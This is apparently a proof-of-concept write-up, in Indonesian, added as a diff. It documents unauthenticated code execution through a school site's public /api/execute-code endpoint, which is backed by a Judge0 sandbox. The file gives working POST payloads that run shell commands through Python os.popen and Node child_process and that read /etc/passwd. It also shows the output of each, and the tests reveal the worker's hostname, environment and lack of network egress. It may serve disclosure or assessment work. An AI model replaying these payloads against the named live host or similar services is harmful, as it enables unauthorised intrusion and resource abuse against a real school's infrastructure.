@@ -1,0 +1,59 @@
+# PoC RCE — execute-code (pedagogiai) — bukti terkuat
+
+Endpoint: `POST https://pedagogiai.smpm12gkb.sch.id/api/execute-code`
+Header body: `{"language":"<py|js|php>","code":"..."}` — tanpa auth, CORS `*`, rate limit 60/min, PHP 8.3.35.
+
+## Hasil eksekusi
+
+### [1] PHP — shell dinonaktifkan sandbox
+```
+POST {"language":"php","code":"<?php system(\"id; hostname; uname -a; pwd; whoami\"); ?>"}
+=> {"success":false,"output":"","error":"✓ Keamanan: Fungsi eksekusi shell dinonaktifkan di sandbox.","exit_code":1}
+```
+
+### [2] Python — shell command eksekusi
+```
+POST {"language":"python","code":"import os;print(os.popen(\"id; hostname; uname -a; pwd\").read())"}
+=> uid=14247937 gid=14247937 groups=14247937
+   hostname: zag-srv02-ce-execution-worker
+   Linux zag-srv02-ce-execution-worker 6.8.0-146-generic #146-Ubuntu SMP PREEMPT_DYNAMIC ... x86_64 GNU/Linux
+   cwd: /box
+   cwd-ls: ['run.sh','script.py']
+```
+
+### [3] JavaScript — child_process execSync
+```
+POST {"language":"javascript","code":"const c=require(\"child_process\");console.log(c.execSync(\"id; hostname; uname -a\").toString())"}
+=> uid=14247938 gid=14247938 groups=14247938
+   zag-srv02-ce-execution-worker
+   Linux ... x86_64 GNU/Linux
+   exit_code: 0
+```
+
+### [4] Arbitrary file read
+```
+POST {"language":"python","code":"print(open(\"/etc/passwd\").read()[:300])"}
+=> root:x:0:0:root:/root:/bin/bash
+   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+   bin:x:2:2:bin:/usr/bin:/usr/sbin/nologin
+   ...
+```
+
+## Karakterisasi sandbox (test [5])
+```
+uid=14247941 (ephemeral — berubah tiap request)   cwd=/box
+/box/run.sh  -> /usr/local/python-3.8.1/bin/python3 script.py
+root_ls = ['files','etc','usr','tmp','proc','lib64','lib','dev','bin','box']
+env = { JUDGE0_VERSION: "1.14.0", JUDGE0_HOMEPAGE: "https://judge0.com",
+         JUDGE0_SOURCE_CODE: "https://github.com/judge0/judge0",
+         JUDGE0_MAINTAINER: "Herman Zvonimir Došilović <hermanz.dosilovic@gmail.com>" }
+egress_TCP = FAIL [Errno 101] Network is unreachable
+dns        = FAIL [Errno -3] Temporary failure in name resolution
+```
+
+## Kesimpulan
+`/api/execute-code` = proxy publik tanpa auth ke **self-hosted Judge0 1.14.0**.
+- Code exec + shell (python/js) berjalan; PHP shell dimatikan oleh policy Judge0.
+- Arbitrary file read di dalam container worker (`/etc/passwd`).
+- Isolasi: uid ephemeral per-run, container `zag-srv02-ce-execution-worker`, **tanpa network egress** (DNS + TCP gagal).
+- Bukan RCE langsung di app-server; eksekusi terkurung di sandbox Judge0. Risiko: abuse resource (judi/crypto/mining), enumerasi/baca berkas dalam worker, eskalasi via celah Judge0 1.14.0 bila ada.
